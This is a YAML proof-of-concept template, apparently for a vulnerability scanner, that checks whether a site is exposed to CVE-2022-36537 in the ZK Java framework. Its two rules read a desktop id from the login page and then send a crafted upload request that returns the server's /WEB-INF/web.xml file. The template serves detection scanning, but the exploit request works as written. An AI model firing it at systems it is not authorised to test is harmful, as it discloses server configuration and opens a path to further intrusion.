name: yaml-poc-zkoss-zk_framework-leak-CVE-2022-36537
binding: e52eb184-9bf8-4657-b1bc-ef7ac30c8aa8
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-36537/
        - https://tracker.zkoss.org/browse/ZK-5150
        - https://www.bleepingcomputer.com/news/security/cisa-warns-of-hackers-exploiting-zk-java-framework-rce-flaw/
    vulnerability:
        id: 383294c0-1f82-42fb-a77a-c31f7f91df45
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /login.zul
            follow_redirects: false
        expression: response.status == 200
        output:
            search: '"dt:''(?P<dtid>.*?)'',cu:".bsubmatch(response.body)'
            dtid: search["dtid"]
    r1:
        request:
            cache: true
            method: POST
            path: /zkau/upload?uuid=101010&dtid={{dtid}}&sid=0&maxsize=-1
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCs6yB0zvpfSBbYEp
            body: "------WebKitFormBoundaryCs6yB0zvpfSBbYEp\r\nContent-Disposition: form-data; name=\"nextURI\"\r\n\r\n/WEB-INF/web.xml\r\n------WebKitFormBoundaryCs6yB0zvpfSBbYEp--\r\n"
        expression: response.status == 200 && response.body.bcontains(b"xml version") && response.body.bcontains(b"<web-app") && "<display-name>.*</display-name>".bmatches(response.body)
expression: r0() && r1()
